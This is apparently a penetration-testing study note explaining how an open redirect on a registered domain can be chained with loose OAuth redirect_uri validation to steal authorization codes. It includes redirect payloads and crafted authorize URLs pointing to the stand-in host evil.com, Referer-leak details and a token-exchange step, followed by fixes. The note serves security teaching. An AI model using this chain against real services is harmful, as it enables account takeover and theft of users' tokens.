---
tags: [vapt, oauth, intermediate]
difficulty: intermediate
module: "19 - OAuth"
topic: "19.08 Open Redirect in Redirect URI"
---

# 19.08 — Open Redirect in Redirect URI

## The Attack Pattern

```
CHAINING:
  redirect_uri validation: domain-based (allows registered domain)
  + open redirect on registered domain
  = Auth code/token stealer!
  
  auth server allows: anything.app.example.com OR app.example.com/*
  app.example.com has: /redirect?url=... (open redirect)
  
  → Attacker combines both to steal OAuth codes!
```

---

## Finding Open Redirects

```bash
# COMMON REDIRECT ENDPOINTS:
/redirect?url=https://evil.com
/out?link=https://evil.com
/go?to=https://evil.com
/forward?next=https://evil.com
/click?href=https://evil.com
/exit?target=https://evil.com
/referral?ref=https://evil.com

# FIND IN JAVASCRIPT:
grep -r "window.location\|location.href\|location.replace\|location.assign" js/

# FIND IN BURP:
# Search for redirect parameters in responses:
# Filter HTTP History → "Response" contains "location" or "redirect"

# TEST FOR OPEN REDIRECT:
curl -v "https://app.example.com/redirect?url=https://evil.com" 2>&1 | grep -i location
# → Location: https://evil.com → OPEN REDIRECT!

# ALSO TEST:
/redirect?url=//evil.com       # Protocol-relative
/redirect?url=javascript:alert(1)  # JS execution (rare but exists)
```

---

## Exploiting for OAuth Code Theft

```
FULL EXPLOIT CHAIN:

PREREQUISITES:
  1. App at: https://app.example.com
  2. OAuth registered redirect_uri: https://app.example.com/callback
  3. Auth server validates: URI starts with https://app.example.com/
     (Prefix match, too loose!)
  4. Open redirect exists: https://app.example.com/redirect?to=ATTACKER_URL

STEP 1: Find open redirect:
  Test: https://app.example.com/redirect?to=https://evil.com
  → Redirects to evil.com → CONFIRMED!

STEP 2: Craft auth URL with redirect through open redirect:
  https://auth.server.com/oauth/authorize?
    client_id=CLIENT_ID&
    redirect_uri=https://app.example.com/redirect?to=https://evil.com&
    response_type=code&
    scope=email&
    state=CSRF_SKIP (if state not validated)

STEP 3: Auth server validates redirect_uri:
  Starts with: https://app.example.com/ → PASS!
  
STEP 4: After victim authenticates:
  Auth server → redirects victim to:
  https://app.example.com/redirect?to=https://evil.com&code=SECRET_CODE&state=...
  
STEP 5: App's open redirect fires:
  → Redirects to: https://evil.com/?code=SECRET_CODE&... [+ Referer with code!]
  
STEP 6: Attacker's evil.com receives:
  The code in URL parameter or Referer header!
  
STEP 7: Exchange code for tokens:
  POST /oauth/token { code=SECRET_CODE, ... }
  → Access token → user data → account takeover!
```

---

## Referer Header Code Leakage

```
EVEN IF REDIRECT GOES TO https://evil.com:
  But the victim's browser (from the open redirect) visits evil.com
  
  evil.com loads resources (images, scripts) that are on different domains
  OR: evil.com itself is the attacker's server
  
  REFERER HEADER SENT:
  When victim's browser goes from:
  https://app.example.com/redirect?to=https://evil.com&code=SECRET_CODE
  
  To evil.com → Referer: https://app.example.com/redirect?to=https://evil.com&code=SECRET_CODE
  
  → Code in Referer header → attacker's server log has it!
  
  Even if code is in fragment (#):
  Some redirectors convert fragment to query parameter!
```

---

## Testing Methodology

```
STEP 1: Find all redirect-like endpoints on the registered redirect domain:
  spider the site, look for redirect patterns
  
STEP 2: Test each for open redirect:
  curl -v "https://app.example.com/redirect?url=https://evil.com"
  → Location: https://evil.com? → OPEN REDIRECT!

STEP 3: Test if auth server accepts redirect_uri pointing to open redirect:
  https://auth.server.com/oauth/authorize?
    ...&redirect_uri=https://app.example.com/redirect?url=https://evil.com

STEP 4: If both vulnerabilities confirmed → chain them in full exploit

STEP 5: Verify code receipt on attacker server
  (Use Burp Collaborator or simple HTTP server)
```

---

## Fix

```
TWO-PART FIX NEEDED:

FIX 1: Strict redirect_uri in auth server:
  EXACT MATCH ONLY:
  Registered: https://app.example.com/callback
  Accepted: ONLY https://app.example.com/callback exactly
  → https://app.example.com/redirect?to=... → REJECTED!

FIX 2: Fix open redirects in the app:
  ✓ Validate the target URL against an allowlist
  ✓ Only allow redirects to known safe URLs
  ✓ Never redirect to arbitrary user-controlled URLs
  
  # Python:
  ALLOWED_REDIRECTS = ['https://app.example.com/', 'https://blog.example.com/']
  def redirect_to(url):
      if url not in ALLOWED_REDIRECTS:
          url = '/'  # Default safe redirect!
      return redirect(url)
```

---

## Related Notes
- [[07 - Redirect URI Manipulation]] — redirect_uri validation bypass
- [[09 - Authorization Code Interception]] — code theft methods
- [[10 - Token Leakage via Referer Header]] — Referer-based token theft
- [[20 - Defense Strict Redirect URI PKCE State Validation]] — full fix
